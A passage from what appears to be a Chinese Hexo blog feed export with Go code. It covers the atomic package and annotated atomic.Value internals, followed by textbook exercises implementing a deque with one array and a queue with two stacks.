go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addValue2</span><span class="params">(delta <span class="type">int32</span>)</span></span>{</span><br><span class="line">    <span class="keyword">for</span>{</span><br><span class="line">    <span class="comment">//使用载入</span></span><br><span class="line">v := atomic.LoadInt32(&amp;value)</span><br><span class="line">        <span class="keyword">if</span> atomic.CompareAndSwapInt32(&amp;value, v, v + delta){</span><br><span class="line">            <span class="comment">//在函数的结果值为true时,退出循环</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="struct类型操作"><a href="#struct类型操作" class="headerlink" title="struct类型操作"></a>struct类型操作</h4><ul><li>如果对一个结构体直接进行赋值，那出现问题的概率更高。线程刚写完一部分字段，读线程就读取了变量，那么只能读到一部分修改的值，破坏了变量的完整性，读到的值也是完全错误的。</li><li>面对这种多线程下变量的读写问题，1.4 版本的时候 <code>atomic.Value</code>登场，它使得我们可以不依赖于不保证兼容性的<code>unsafe.Pointer</code>类型，同时又能将任意数据类型的读写操作封装成原子性操作（让中间状态对外不可见）。</li></ul><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用示例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Config <span class="keyword">struct</span> {</span><br><span class="line">Addr <span class="type">string</span></span><br><span class="line">Port <span class="type">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Config)</span></span> String() <span class="type">string</span> {</span><br><span class="line"><span class="keyword">return</span> c.Addr + <span class="string">":"</span> + c.Port</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadConfig</span><span class="params">()</span></span> Config {</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line"><span class="keyword">return</span> Config{}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">automicValue</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> config atomic.Value</span><br><span class="line">wg := sync.WaitGroup{}</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">for</span> {</span><br><span class="line">time.Sleep(time.Millisecond)</span><br><span class="line">config.Store(loadConfig())</span><br><span class="line">}</span><br><span class="line">}()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++ {</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> {</span><br><span class="line">c := config.Load().(Config)</span><br><span class="line">fmt.Println(c)</span><br><span class="line">wg.Done()</span><br><span class="line">}()</span><br><span class="line">}</span><br><span class="line">wg.Wait()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="atomic-Value-设计与实现"><a href="#atomic-Value-设计与实现" class="headerlink" title="atomic.Value 设计与实现"></a>atomic.Value 设计与实现</h4><p><code>atomic</code>包中除了<code>atomic.Value</code>外，其余都是早期由汇编写成的，<code>atomic.Value</code>类型的底层实现也是建立在已有的<code>atomic</code>包的基础上。</p><blockquote><h5 id="goroutine抢占"><a href="#goroutine抢占" class="headerlink" title="goroutine抢占"></a>goroutine抢占</h5><p>Go中调度器是GMP模型，简单理解G就是goroutine；M可以类比内核线程，是执行G的地方；P是调度G以及为G的执行准备所需资源。一般情况下，P的数量CPU的可用核心数，也可由<code>runtime.GOMAXPROCS</code>指定。</p><p>调度规则：某个G不能一直占用M，在某个时刻的时候，runtime会判断当前M是否可以被抢占，即M上正在执行的G让出。P在合理的时刻将G调度到合理的M上执行，在runtime里面，每个P维护一个本地存放待执行G的队列localq，同时还存在一个全局的待执行G的队列globalq；调度就是P从localq或globalq中取出G到对应的M上执行，所谓抢占，runtime将G抢占移出运行状态，拷贝G的执行栈放入待执行队列中，可能是某个P的localq，也可能是globalq，等待下一次调度，因此当被抢占的G重回待执行队列时有可能此时的P与前一次运行的P并非同一个。</p><p>所谓禁止抢占，即当前执行G不允许被抢占调度，直到禁止抢占标记解除。Go runtime实现了G的禁止抢占与解除禁止抢占。</p></blockquote><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//atomic.Value源码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Value <span class="keyword">struct</span> {</span><br><span class="line">v <span class="keyword">interface</span>{} <span class="comment">// 所以可以存储任何类型的数据</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 空 interface{} 的内部表示格式，作用是将interface{}类型分解，得到其中两个字段</span></span><br><span class="line"><span class="keyword">type</span> ifaceWords <span class="keyword">struct</span> {</span><br><span class="line">typ  unsafe.Pointer</span><br><span class="line">data unsafe.Pointer</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取数据就是正常走流程</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Value)</span></span> Load() (x <span class="keyword">interface</span>{}) {</span><br><span class="line">vp := (*ifaceWords)(unsafe.Pointer(v))</span><br><span class="line">typ := LoadPointer(&amp;vp.typ)</span><br><span class="line"><span class="keyword">if</span> typ == <span class="literal">nil</span> || <span class="type">uintptr</span>(typ) == ^<span class="type">uintptr</span>(<span class="number">0</span>) {</span><br><span class="line"><span class="comment">// 第一次还没写入</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line">  <span class="comment">// 构造新的interface{}返回出去</span></span><br><span class="line">data := LoadPointer(&amp;vp.data)</span><br><span class="line">xp := (*ifaceWords)(unsafe.Pointer(&amp;x))</span><br><span class="line">xp.typ = typ</span><br><span class="line">xp.data = data</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写数据（如何保证数据完整性）</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Value)</span></span> Store(x <span class="keyword">interface</span>{}) {</span><br><span class="line"><span class="keyword">if</span> x == <span class="literal">nil</span> {</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"sync/atomic: store of nil value into Value"</span>)</span><br><span class="line">}</span><br><span class="line">  <span class="comment">// 绕过 Go 语言类型系统的检查，与任意的指针类型互相转换</span></span><br><span class="line">vp := (*ifaceWords)(unsafe.Pointer(v)) <span class="comment">// 旧值</span></span><br><span class="line">xp := (*ifaceWords)(unsafe.Pointer(&amp;x)) <span class="comment">// 新值</span></span><br><span class="line"><span class="keyword">for</span> { <span class="comment">// 配合CompareAndSwap达到乐观锁的功效</span></span><br><span class="line">typ := LoadPointer(&amp;vp.typ)</span><br><span class="line"><span class="keyword">if</span> typ == <span class="literal">nil</span> { <span class="comment">// 第一次写入</span></span><br><span class="line">runtime_procPin() <span class="comment">// 禁止抢占</span></span><br><span class="line"><span class="keyword">if</span> !CompareAndSwapPointer(&amp;vp.typ, <span class="literal">nil</span>, unsafe.Pointer(^<span class="type">uintptr</span>(<span class="number">0</span>))) {</span><br><span class="line">runtime_procUnpin() <span class="comment">// 没有抢到锁，说明已经有别的线程抢先完成赋值，重新进入循环</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// 首次赋值</span></span><br><span class="line">StorePointer(&amp;vp.data, xp.data)</span><br><span class="line">StorePointer(&amp;vp.typ, xp.typ)</span><br><span class="line">runtime_procUnpin() <span class="comment">// 写入成功，解除占用状态</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> <span class="type">uintptr</span>(typ) == ^<span class="type">uintptr</span>(<span class="number">0</span>) {</span><br><span class="line"><span class="comment">// 第一次写入还未完成，继续等待</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">}</span><br><span class="line"><span class="comment">// 两次需要写入相同类型</span></span><br><span class="line"><span class="keyword">if</span> typ != xp.typ {</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"sync/atomic: store of inconsistently typed value into Value"</span>)</span><br><span class="line">}</span><br><span class="line">StorePointer(&amp;vp.data, xp.data)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止抢占，标记当前G在M上不会被抢占，并返回当前所在P的ID。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runtime_procPin</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">// 解除G的禁止抢占状态，之后G可被抢占。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runtime_procUnpin</span><span class="params">()</span></span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><hr><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://studygolang.com/pkgdoc">Go语言中文网</a></p><p><a href="https://blog.betacat.io/post/golang-atomic-value-exploration/">Go 语言标准库中 atomic.Value 的前世今生</a></p><p><a href="https://www.cnblogs.com/sunsky303/p/11820500.html">你不知道的Go unsafe.Pointer uintptr原理和玩法</a></p><p><a href="https://segmentfault.com/a/1190000021944703">理解Go 1.13中sync.Pool的设计与实现</a></p><p><a href="https://segmentfault.com/a/1190000017783070">Go Slice 最大容量大小是怎么来的</a></p><p><a href="https://juejin.cn/post/6844903662553137165">Golang 的 协程调度机制 与 GOMAXPROCS 性能调优</a></p><p><a href="https://www.kancloud.cn/digest/batu-go/153537">Golang同步：原子操作使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> atomic包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论-单数组实现双端队列</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E5%8D%95%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E5%8F%8C%E7%AB%AF%E9%98%9F%E5%88%97/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E5%8D%95%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E5%8F%8C%E7%AB%AF%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列-deque-，其插入和删除操作都可以在两端进行。写出4个时间均为O-1-的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。"><a href="#栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列-deque-，其插入和删除操作都可以在两端进行。写出4个时间均为O-1-的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。" class="headerlink" title="栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列(deque)，其插入和删除操作都可以在两端进行。写出4个时间均为O(1)的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。"></a>栈插入和删除元素只能在同一端进行，队列的插入操作和删除操作分别在两端进行，与它们不同的，有一种双端队列(deque)，其插入和删除操作都可以在两端进行。写出4个时间均为O(1)的过程，分别实现在双端队列插入和删除元素的操作，该队列使用一个数组实现的。</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个数组实现双端队列</span></span><br><span class="line"><span class="keyword">const</span> maxSize = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Deque <span class="keyword">struct</span> {</span><br><span class="line">leftHead  <span class="type">int</span></span><br><span class="line">rightHead <span class="type">int</span></span><br><span class="line">size      <span class="type">int</span> <span class="comment">// 记录现有元素数量</span></span><br><span class="line">arr       [maxSize]<span class="type">int</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> isEmpty() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">return</span> d.size == <span class="number">0</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> isFull() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> d.size == <span class="built_in">len</span>(d.arr) {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> pre(position <span class="type">int</span>) <span class="type">int</span> {</span><br><span class="line"><span class="keyword">if</span> position == <span class="number">0</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(d.arr) - <span class="number">1</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> position - <span class="number">1</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> next(position <span class="type">int</span>) <span class="type">int</span> {</span><br><span class="line"><span class="keyword">if</span> position == <span class="built_in">len</span>(d.arr)<span class="number">-1</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> position + <span class="number">1</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> LeftInsert(val <span class="type">int</span>) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> d.isFull() {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> d.isEmpty() {</span><br><span class="line">d.rightHead = d.next(d.rightHead)</span><br><span class="line">}</span><br><span class="line">d.arr[d.leftHead] = val</span><br><span class="line">d.size++</span><br><span class="line">d.leftHead = d.pre(d.leftHead)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> RightInsert(val <span class="type">int</span>) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> d.isFull() {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> d.isEmpty() {</span><br><span class="line">d.leftHead = d.pre(d.leftHead)</span><br><span class="line">}</span><br><span class="line">d.arr[d.rightHead] = val</span><br><span class="line">d.size++</span><br><span class="line">d.rightHead = d.next(d.rightHead)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> LeftDelete() (<span class="type">int</span>, <span class="type">bool</span>) {</span><br><span class="line"><span class="keyword">if</span> d.isEmpty() {</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line">d.leftHead = d.next(d.leftHead)</span><br><span class="line"><span class="keyword">if</span> d.isEmpty() {</span><br><span class="line">d.rightHead = d.pre(d.rightHead)</span><br><span class="line">}</span><br><span class="line">val := d.arr[d.leftHead]</span><br><span class="line">d.size--</span><br><span class="line"><span class="keyword">return</span> val, <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Deque)</span></span> RightDelete() (<span class="type">int</span>, <span class="type">bool</span>) {</span><br><span class="line"><span class="keyword">if</span> d.isEmpty() {</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line">d.rightHead = d.pre(d.rightHead)</span><br><span class="line"><span class="keyword">if</span> d.isEmpty() {</span><br><span class="line">d.leftHead = d.next(d.leftHead)</span><br><span class="line">}</span><br><span class="line">val := d.arr[d.rightHead]</span><br><span class="line">d.size--</span><br><span class="line"><span class="keyword">return</span> val, <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> deque = Deque{</span><br><span class="line">leftHead:  <span class="number">0</span>,</span><br><span class="line">rightHead: <span class="number">0</span>,</span><br><span class="line">arr:       [maxSize]<span class="type">int</span>{},</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论-两个栈实现队列</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="用两个栈实现队列，并分析相关队列操作的运行时间。"><a href="#用两个栈实现队列，并分析相关队列操作的运行时间。" class="headerlink" title="用两个栈实现队列，并分析相关队列操作的运行时间。"></a>用两个栈实现队列，并分析相关队列操作的运行时间。</h3><ul><li>单栈push和pop的运行时间都为O(1)，所以需要考虑的就是两个栈之间切换所用时间。</li><li>最坏情况：在push和pop交替操作时，需要将一个栈中的数据转移到另一个栈中，转移所用时间为O(n)，n为当前栈中元素个数。</li><li>最好情况：用flag记录上一次是push还是pop，如果和当前操作一致，则直接操作对应的栈，时间复杂度为O(1)。<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> maxSize = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> StackDeque <span class="keyword">struct</span> {</span><br><span class="line">pushStack *Stack</span><br><span class="line">popStack  *Stack</span><br><span class="line">flag      <span class="type">bool</span> <span class="comment">// true in push，false in pop</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StackDeque)</span></span> exchange(from, to *Stack) {</span><br><span class="line">to.Clean()</span><br><span class="line"><span class="keyword">for</span> <span class="literal">true</span> {</span><br><span class="line"><span class="keyword">if</span> v, ok := from.Pop(); ok {</span><br><span class="line">to.Push(v)</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">s.flag = !s.flag</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StackDeque)</span></span> Push(val <span class="type">int</span>) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> !s.flag { <span class="comment">// 当前在pop栈</span></span><br><span class="line">s.exchange(s.popStack, s.pushStack)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> s.pushStack.Push(val)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *StackDeque)</span></span> Pop() (<span class="type">int</span>, <span class="type">bool</span>) {</span><br><span class="line"><span class="keyword">if</span> s.flag {</span><br><span class="line">s.exchange(s.pushStack, s.popStack)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> s.popStack.Pop()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------实现栈开始----------------</span></span><br><span class="line"><span class="keyword">type</span> Stack <span class="keyword">struct</span> {</span><br><span class="line">arr  [maxSize]<span class="type">int</span></span><br><span class="line">size <span class="type">int</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> isFull() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> s.size == maxSize {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> isEmpty() <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> s.size == <span class="number">0</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> Push(val <span class="type">int</span>) <span class="type">bool</span> {</span><br><span class="line"><span class="keyword">if</span> s.isFull() {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line">s.arr[s.size] = val</span><br><span class="line">s.size++</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> Pop() (<span class="type">int</span>, <span class="type">bool</span>) {</span><br><span class="line"><span class="keyword">if</span> s.isEmpty() {</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, <span class="literal">false</span></span><br><span class="line">}</span><br><span class="line">val := s.arr[s.size<span class="number">-1</span>]</span><br><span class="line">s.size--</span><br><span class="line"><span class="keyword">return</span> val, <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Stack)</span></span> Clean() {</span><br><span class="line">s.size = <span class="number">0</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// ----------------实现栈结束----------------</span></span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 算法导论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法导论-两个队列实现栈</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-03-07-%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA-%E4%B8%A4%E4%B8%AA%E9%98%9F%E5%88%97%E5%AE%9E%E7%8E%B0%E6%A0%88/</url>
      
